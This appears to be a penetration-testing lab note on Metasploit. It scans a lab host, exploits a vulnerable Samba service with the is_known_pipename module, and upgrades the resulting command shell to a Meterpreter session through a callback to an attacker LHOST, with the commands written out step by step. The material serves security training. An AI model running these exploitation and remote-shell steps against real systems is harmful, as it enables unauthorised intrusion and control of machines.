# Upgrading Command Shells To Meterpreter Shells

[Home](../README.md) · [Section index](README.md)

> Adapted from the original notes, lines 4919–4952. Examples are lab-specific and need verification.

Upgrading a command shell to a Meterpreter shell in Metasploit is a powerful technique during penetration testing, as Meterpreter provides advanced features that are not available in a standard command shell. Meterpreter is a sophisticated payload that provides an interactive shell and allows for extensive post-exploitation activities, such as file system browsing, process manipulation, and network pivoting. This lab covers the process of upgrading a command shell to a meterpreter session.

In this lab environment, you will be provided with GUI access to a Kali machine. The target machine running a vulnerable service will be accessible at **demo.ine.local**.

**Objective:** Exploit the vulnerable service using suitable Metasploit module and then upgrade the command shell session to a meterpreter session.

**Tools: nmap , msf**

```bash
nmap -sV demo.ine.local
#the Nmap scan reveals a vulnerable version of SAMBA running on port 445 that can be exploited through the use of a Metasploit module.

msfconsole
use exploit/linux/samba/is_known_pipename
set RHOSTS demo.ine.local
exploit

#got shell
whoami
pwd
#upgrading shell to meterpreter shell

CTRL + Z
#msf
use post/multi/manage/shell_to_meterpreter
set SESSION 1
set LHOST 192.212.191.2
run
sessions 2
#meterpreter
```
